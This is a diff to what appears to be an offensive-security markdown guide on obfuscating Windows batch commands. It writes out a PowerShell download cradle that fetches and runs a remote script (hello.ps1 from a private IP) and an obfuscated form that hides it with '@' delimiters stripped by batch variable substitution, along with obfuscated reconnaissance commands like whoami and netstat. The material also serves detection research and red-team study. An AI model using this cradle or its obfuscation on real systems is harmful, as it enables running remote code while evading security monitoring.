@@ -443,13 +443,14 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
 ![pipe commands](http://i.cubeupload.com/McTrjq.jpg)
 
-      Using the delimiter remove technic into one cradle downloader (powershell) TODO:
+      Using the delimiter remove technic into one cradle downloader (powershell)
 
 - String command to obfuscate<br />
 `cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/hello.ps1')`
 
 - String obfuscated<br />
-`cmd.exe /c "set x=po@wer@sh@ell.ex@e I@E@X (N@ew-O@bje@ct @Ne@t.@WebC@lie@nt).Do@wnl@oad@St@ri@ng('ht'+'@tp:'+'//@1'+'92@.1'+'6@8.'+'1.71/he@ll@o.ps@1')&&echo %x:@=% | cmd"`
+
+      cmd.exe /c "set x=po@wer@sh@ell.ex@e I@E@X (N@ew-O@bje@ct @Ne@t.@WebC@lie@nt).Do@wnl@oad@St@ri@ng('ht'+'@tp:'+'//@1'+'92@.1'+'6@8.'+'1.71/he@ll@o.ps@1')&&echo %x:@=% | cmd"
 
 ![pipe commands](http://i.cubeupload.com/tv0oWc.jpg)
 
@@ -472,7 +473,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
 - String obfuscated [double Parentheses]<br />
 `cmd.exe /c ((whoami)) && ((netstat))`<br />
 
-![batch obfuscation](http://i.cubeupload.com/72IYdJ.jpg) whitespaces+collon+semi-collon+caret
+![batch obfuscation](http://i.cubeupload.com/72IYdJ.jpg)
 
 - string more obfuscated using: Parentheses+carets+double_quotes+collon+semi-collon<br />
 
